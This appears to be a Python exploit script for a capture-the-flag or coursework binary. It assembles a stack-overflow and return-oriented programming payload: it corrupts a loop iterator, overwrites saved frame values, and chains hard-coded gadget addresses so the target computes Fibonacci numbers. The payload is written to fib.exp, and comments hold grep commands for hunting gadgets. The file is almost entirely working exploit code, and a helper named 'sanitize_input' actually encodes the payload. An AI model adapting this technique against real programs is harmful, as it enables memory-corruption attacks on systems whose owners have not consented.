def sanitize_input(exploit_str):
	exploit_str_b = bytes.fromhex(exploit_str)
	exploit_str_split = [exploit_str_b[i:i + 1] for i in range(0, len(exploit_str_b), 1)]
	exploit_str_split.reverse()
	sanitize_exploit_str = b"\n".join(exploit_str_split) + b"\n"
	return sanitize_exploit_str




####################### STEP 0 : Corrupt loop iterator and overflow till frame pointer in stack #######################
corrupt_loop_iterator=b"V"*12+b"CC8"
set_team_name=b"a\nl\nG\nr\ni\nn\nd\ns\n!\n"+0xe*b"1\n" #+b"A\nB\nC\nD\n" #b"\x6c\n\xa0\n\x0e\n\x08\n" 

step_0 = corrupt_loop_iterator + set_team_name


####################### STEP 0-1 : save ebp for easy return #######################




ebp="\x68"*12 + "\x00"*3 +  "\xd5"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3
ret_to_main = "\x53"*12 + "\x00"*3 +  "\x89"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3
glb_add= "\x20"*12 + "\x00"*3 +  "\xba"*12 + "\x00"*3 + "\x0e"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # Address of glb




####################### STEP 1 : initialize eax=1, ecx=0, edx=0 #######################
# xor eax, eax
# mov ecx, eax
# push ecx
# inc eax
# mov edx, dword ptr[esp] 
step_1 = sanitize_input("0804fe30") + sanitize_input("08098b58") + sanitize_input("0807c315") + sanitize_input("0808883e") + sanitize_input("0805866a")

####################### STEP 2 : loop for fibonaci #######################
# mov ecx, eax
# push ecx
# mov edx, dword ptr[esp] 
# add eax, edx
step_2 = sanitize_input("08098b58") + sanitize_input("0807c315") + sanitize_input("0805866a") + sanitize_input("08071553")
rounds = int(input())
step_2 = step_2 * rounds


####################### STEP 3 : push result at eax on stack #######################
# push ecx
step_3 = sanitize_input("080b028a")


####################### STEP 4 : set main return #######################

step_4 = sanitize_input("08049ea7")

####################### STEP 5 : Exiting loop #######################
step_5 = b"1"*12+b"\x09\x00\x00\x00\x00\n1\n"


# Final payload
payload = step_0 + step_1 + step_2  + step_3 + step_4 + step_5

exp_file_name = "fib.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()

# grep -P ": mov dword ptr" list_gadgets.txt | grep -e "ret"
# grep -P ": pop edx" list_gadgets.txt | grep -e "ret"
# grep -P ": pop eax" list_gadgets.txt | grep -e "ret"


# grep -P ": xor eax, eax" list_gadgets.txt | grep -e "ret"
# grep -P ": pop ecx" list_gadgets.txt | grep -e "ret"
# grep -P ": xor edx, edx" list_gadgets.txt | grep -e "ret"
# grep -P ": mov edx" list_gadgets.txt | grep -e "ret"
